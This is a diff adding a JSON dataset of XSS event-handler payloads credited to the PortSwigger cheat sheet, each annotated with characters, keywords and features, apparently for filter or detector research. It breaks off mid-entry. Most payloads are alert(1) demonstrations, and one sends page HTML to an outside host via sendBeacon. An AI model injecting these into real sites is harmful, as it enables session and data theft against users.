@@ -1,0 +1,4692 @@
+{
+  "meta": {
+    "source": "PortSwigger XSS Cheat Sheet 2026",
+    "author": "PortSwigger Research (Gareth Heyes)",
+    "last_updated_source": "2026-05-22",
+    "extracted_date": "2026-07-29",
+    "total_event_vectors": 140
+  },
+  "event_handlers_no_user_interaction": [
+    {
+      "name": "onanimationcancel",
+      "description": "Fires when a CSS animation cancels",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 175
+      }
+    },
+    {
+      "name": "onanimationend",
+      "description": "Fires when a CSS animation ends",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 91
+      }
+    },
+    {
+      "name": "onanimationiteration",
+      "description": "Fires when a CSS animation repeats",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration- count:2\" onanimationiteration=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 161
+      }
+    },
+    {
+      "name": "onanimationstart",
+      "description": "Fires when a CSS animation starts",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 93
+      }
+    },
+    {
+      "name": "onbeforematch",
+      "description": "Fires when a hidden element is revealed",
+      "tag_context": "custom tags",
+      "payload": "<xss id=x onbeforematch=alert(1) hidden=until-found>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 52
+      }
+    },
+    {
+      "name": "onbeforeprint",
+      "description": "Fires before the page is printed",
+      "tag_context": "body",
+      "payload": "<body onbeforeprint=console.log(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 35
+      }
+    },
+    {
+      "name": "onbeforeunload",
+      "description": "Fires after if the url changes",
+      "tag_context": "body",
+      "payload": "<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "'",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "document",
+        "innerhtml"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 97
+      }
+    },
+    {
+      "name": "onbegin",
+      "description": "Fires when a svg animation begins",
+      "tag_context": "animate",
+      "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "svg"
+      ],
+      "tag_base": "svg",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": true,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 54
+      }
+    },
+    {
+      "name": "oncanplay",
+      "description": "Fires if the resource can be played",
+      "tag_context": "audio",
+      "payload": "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 80
+      }
+    },
+    {
+      "name": "oncanplaythrough",
+      "description": "Fires when enough data has been loaded to play the resource all the way through",
+      "tag_context": "video",
+      "payload": "<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 87
+      }
+    },
+    {
+      "name": "oncontentvisibilityautostatechange",
+      "description": "Fires on all tags when content-visibility is set to auto",
+      "tag_context": "custom tags",
+      "payload": "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        ";",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 93
+      }
+    },
+    {
+      "name": "oncuechange",
+      "description": "Fires when subtitle changes",
+      "tag_context": "track",
+      "payload": "<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=\"data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> \"></video>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert",
+        "data:"
+      ],
+      "tag_base": "video",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": true,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 178
+      }
+    },
+    {
+      "name": "ondurationchange",
+      "description": "Fires when duration changes",
+      "tag_context": "audio",
+      "payload": "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 93
+      }
+    },
+    {
+      "name": "onend",
+      "description": "Fires when a svg animation ends",
+      "tag_context": "animate",
+      "payload": "<svg><animate onend=alert(1) attributeName=x dur=1s>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "svg"
+      ],
+      "tag_base": "svg",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": true,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 52
+      }
+    },
+    {
+      "name": "onended",
+      "description": "Fires when the resource is finished playing",
+      "tag_context": "audio",
+      "payload": "<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 96
+      }
+    },
+    {
+      "name": "onerror",
+      "description": "Fires when the resource fails to load or causes an error",
+      "tag_context": "audio",
+      "payload": "<audio src/onerror=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert",
+        "onerror"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 28
+      }
+    },
+    {
+      "name": "onfocus",
+      "description": "Fires when the element has focus",
+      "tag_context": "a",
+      "payload": "<a id=x tabindex=1 onfocus=alert(1)></a>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "a",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 40
+      }
+    },
+    {
+      "name": "onfocusin",
+      "description": "Fires when the element has focus",
+      "tag_context": "a",
+      "payload": "<a id=x tabindex=1 onfocusin=alert(1)></a>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "a",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 42
+      }
+    },
+    {
+      "name": "onhashchange",
+      "description": "Fires if the hash changes",
+      "tag_context": "body",
+      "payload": "<body onhashchange=\"print()\">",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 29
+      }
+    },
+    {
+      "name": "onload",
+      "description": "Fires when the element is loaded",
+      "tag_context": "body",
+      "payload": "<body onload=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "onload"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 22
+      }
+    },
+    {
+      "name": "onloadeddata",
+      "description": "Fires when the first frame is loaded",
+      "tag_context": "audio",
+      "payload": "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert",
+        "onload"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 83
+      }
+    },
+    {
+      "name": "onloadedmetadata",
+      "description": "Fires when the meta data is loaded",
+      "tag_context": "audio",
+      "payload": "<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert",
+        "onload"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 97
+      }
+    },
+    {
+      "name": "onloadstart",
+      "description": "Triggered audio or video is loaded",
+      "tag_context": "audio",
+      "payload": "<audio onloadstart=\"alert(1)\"><source>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "onload"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 38
+      }
+    },
+    {
+      "name": "onmessage",
+      "description": "Fires when message event is received from a postMessage call",
+      "tag_context": "body",
+      "payload": "<body onmessage=print()>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 24
+      }
+    },
+    {
+      "name": "onpagereveal",
+      "description": "Fires when the page is shown",
+      "tag_context": "body",
+      "payload": "<body onpagereveal=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 28
+      }
+    },
+    {
+      "name": "onpageshow",
+      "description": "Fires when the page is shown",
+      "tag_context": "body",
+      "payload": "<body onpageshow=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 26
+      }
+    },
+    {
+      "name": "onplay",
+      "description": "Fires when the resource is played",
+      "tag_context": "audio",
+      "payload": "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 86
+      }
+    },
+    {
+      "name": "onplaying",
+      "description": "Fires the resource is playing",
+      "tag_context": "audio",
+      "payload": "<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 89
+      }
+    },
+    {
+      "name": "onpopstate",
+      "description": "Fires when the history changes",
+      "tag_context": "body",
+      "payload": "<body onpopstate=print()>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 25
+      }
+    },
+    {
+      "name": "onprogress",
+      "description": "Fires when the video/audio begins downloading",
+      "tag_context": "audio",
+      "payload": "<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 87
+      }
+    },
+    {
+      "name": "onrepeat",
+      "description": "Fires when a svg animation repeats",
+      "tag_context": "animate",
+      "payload": "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert",
+        "svg"
+      ],
+      "tag_base": "svg",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": true,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 71
+      }
+    },
+    {
+      "name": "onresize",
+      "description": "Fires when the window is resized",
+      "tag_context": "body",
+      "payload": "<body onresize=\"print()\">",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 25
+      }
+    },
+    {
+      "name": "onscroll",
+      "description": "Fires when the page scrolls",
+      "tag_context": "body",
+      "payload": "<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 71
+      }
+    },
+    {
+      "name": "onscrollend",
+      "description": "Fires when the scrolling to the end of the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br> <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><span id=x>test</span></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 272
+      }
+    },
+    {
+      "name": "onscrollsnapchange",
+      "description": "Fires at the end of a scrolling operation",
+      "tag_context": "address",
+      "payload": "<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap- align:center>1337</div></address>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "address",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 137
+      }
+    },
+    {
+      "name": "onscrollsnapchanging",
+      "description": "Fires when the scroll position is snapping to a new point",
+      "tag_context": "custom tags",
+      "payload": "<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=\"scroll- container\" onscrollsnapchanging=\"alert(1)\"> <xss class=\"scroll-item\">Item 1</xss><xss class=\"scroll-item\">Item 2</xss></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":",
+        "%"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 448
+      }
+    },
+    {
+      "name": "onsecuritypolicyviolation",
+      "description": "Fires when a CSP violation occurs. This would be site specific.",
+      "tag_context": "custom tags",
+      "payload": "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 49
+      }
+    },
+    {
+      "name": "onslotchange",
+      "description": "Fires when the slot’s assigned content changes",
+      "tag_context": "slot",
+      "payload": "x<template shadowrootmode=open><slot onslotchange=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "template",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 59
+      }
+    },
+    {
+      "name": "onsuspend",
+      "description": "Fires when the video/audio when the data loading is suspended",
+      "tag_context": "audio",
+      "payload": "<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 86
+      }
+    },
+    {
+      "name": "ontimeupdate",
+      "description": "Fires when the timeline is changed",
+      "tag_context": "audio",
+      "payload": "<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
